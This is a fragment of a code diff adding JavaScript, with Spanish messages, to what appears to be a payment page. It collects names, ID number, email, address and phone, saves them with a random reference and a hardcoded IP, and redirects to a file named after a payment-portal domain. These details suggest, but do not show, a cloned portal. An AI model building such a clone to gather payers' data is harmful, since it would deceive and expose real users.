+                    // ERROR
+                    alert("No se encontró información o hubo un error.\n" + (json.error || ""));
+                    location.reload();
+                }
+
+            } catch (e) {
+                console.error(e);
+                alert("Error al conectar con el servidor.");
+                location.reload();
+            }
+        });
+
+        // Función global para guardar y saltar a pasarela
+        window.guardarYRedirigir = function(monto, tipo) {
+            const nombres = document.getElementById('nombres').value;
+            const apellidos = document.getElementById('apellidos').value;
+            const tipoId = document.getElementById('tipoId').value;
+            const numId = document.getElementById('numId').value;
+            const correo = document.getElementById('correo').value;
+            const direccion = document.getElementById('direccion').value;
+            const celular = document.getElementById('celular').value;
+
+            if(!nombres || !apellidos || !numId || !correo) {
+                alert("Por favor, diligencie los datos personales antes de continuar.");
+                return;
+            }
+
+            let valorFinal = monto;
+            if(tipo === 'abono') {
+                const valorAbono = document.getElementById('inputAbono').value;
+                if(!valorAbono) {
+                    alert("Ingrese el valor a abonar");
+                    return;
+                }
+                valorFinal = valorAbono.replace(/[^\d]/g, '');
+            }
+
+            const datosUsuario = {
+                nombreCompleto: nombres + " " + apellidos,
+                tipoId: tipoId,
+                numId: numId,
+                correo: correo,
+                direccion: direccion,
+                celular: celular,
+                montoPagar: parseInt(valorFinal, 10),
+                referencia: Math.floor(Math.random() * 100000000), 
+                ip: "181.51.89.21" 
+            };
+
+            localStorage.setItem('datosFactura', JSON.stringify(datosUsuario));
+            window.location.href = 'portalpagos.portalfacture.com.html';
+        };
